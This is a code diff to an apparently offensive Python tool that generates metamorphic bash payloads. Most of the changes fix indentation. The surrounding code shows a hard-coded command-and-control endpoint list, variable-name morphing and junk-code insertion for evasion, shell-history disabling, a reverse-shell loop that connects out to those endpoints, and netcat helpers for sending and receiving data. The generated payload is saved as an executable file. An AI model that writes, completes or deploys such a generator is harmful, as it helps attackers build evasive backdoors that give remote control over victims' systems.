@@ -20,6 +20,7 @@ C2_ENDPOINTS = [
     ("192.168.1.1", 1337)
 ]
 
+
 # --- Enhanced Variable/Function Name Morphing ---
 def random_unicode_letter():
     # Only use bash-valid characters
@@ -213,10 +214,10 @@ set +o history
 
 def generate_metamorphic_payload():
     try:
-    filename = generate_unique_filename()
-    # Morph all variable names
-    vars = {k: morph_name(k) for k in [
-        'client', 'stream', 'bytes', 'data', 'sendback', 'sendback2', 'sendbyte', 'encoding',
+        filename = generate_unique_filename()
+        # Morph all variable names
+        vars = {k: morph_name(k) for k in [
+            'client', 'stream', 'bytes', 'data', 'sendback', 'sendback2', 'sendbyte', 'encoding',
             'readLength', 'cmd', 'result', 'junk', 'junk2', 'junk3', 'success', 'socket', 'buffer'
         ]}
 
@@ -227,7 +228,7 @@ def generate_metamorphic_payload():
         buffer_var = morph_name('buffer')
 
         # Network Operations with direct bash reverse shell for reliability
-    network = f"""
+        network = f"""
 # Network Operations
 while true; do
     for endpoint in "{random.choice(C2_ENDPOINTS)[0]}:{random.choice(C2_ENDPOINTS)[1]}" "{random.choice(C2_ENDPOINTS)[0]}:{random.choice(C2_ENDPOINTS)[1]}"; do
@@ -247,18 +248,18 @@ done
 
         # Insert more junk code randomly (but never before evasion)
         for _ in range(random.randint(15, 25)):
-        idx = random.randint(0, len(blocks))
-        blocks.insert(idx, random_junk_code())
+            idx = random.randint(0, len(blocks))
+            blocks.insert(idx, random_junk_code())
 
         # Add shebang and error handling
         code = "#!/bin/bash\nset -e\n\n"
         
-    # Add enhanced helper functions
-    code += """
-    # Enhanced helper functions
+        # Add enhanced helper functions
+        code += """
+        # Enhanced helper functions
 function str_to_bytes() {
     echo -n "$1" | xxd -p
-    }
+}
 
 function to_base64() {
     echo -n "$1" | base64
@@ -266,7 +267,7 @@ function to_base64() {
 
 function from_base64() {
     echo -n "$1" | base64 -d
-    }
+}
 
 function to_hex() {
     echo -n "$1" | xxd -p
@@ -278,7 +279,7 @@ function from_hex() {
 
 function rot13() {
     echo "$1" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
-    }
+}
 
 function to_unicode() {
     echo -n "$1" | xxd -p | sed 's/\\(..\\)/\\u00\\1/g'
@@ -290,7 +291,7 @@ function from_unicode() {
 
 function to_binary() {
     echo -n "$1" | xxd -b | cut -d' ' -f2-7 | tr -d ' '
-    }
+}
 
 function from_binary() {
     echo "$1" | sed 's/\\(........\\)/\\1 /g' | tr -d ' ' | perl -lpe '$_=pack("B*",$_)'
@@ -311,7 +312,7 @@ function receive_data() {
     local output="$4"
     nc -w "$timeout" "$host" "$port" > "$output" 2>/dev/null
     return $?
-    }
+}
 
 function send_data() {
     local host="$1"
@@ -319,7 +320,7 @@ function send_data() {
     local data="$3"
     echo -n "$data" | nc -w 5 "$host" "$port" 2>/dev/null
     return $?
-    }
+}
 
 function verify_payload() {
     local file="$1"
@@ -327,7 +328,7 @@ function verify_payload() {
         return 0
     fi
     return 1
-    }
+}
 
 function cleanup() {
     local file="$1"
@@ -345,11 +346,11 @@ trap 'cleanup "$"""
         # Add evasion first, then all other blocks
         code += evasion + '\n' + '\n'.join(blocks)
 
-    # Save with unique filename
-    with open(filename, 'w') as f:
-        f.write(code)
-        os.chmod(filename, 0o755)  # Make executable
-    return filename
+        # Save with unique filename
+        with open(filename, 'w') as f:
+            f.write(code)
+            os.chmod(filename, 0o755)  # Make executable
+        return filename
     except Exception as e:
         print(f"Error generating payload: {e}", file=sys.stderr)
         # Create a basic error payload
@@ -372,3 +373,4 @@ if __name__ == "__main__":
             f.write(f"# ERROR: {e}\n")
         os.chmod('payload_error.sh', 0o755)
         exit(1)
+
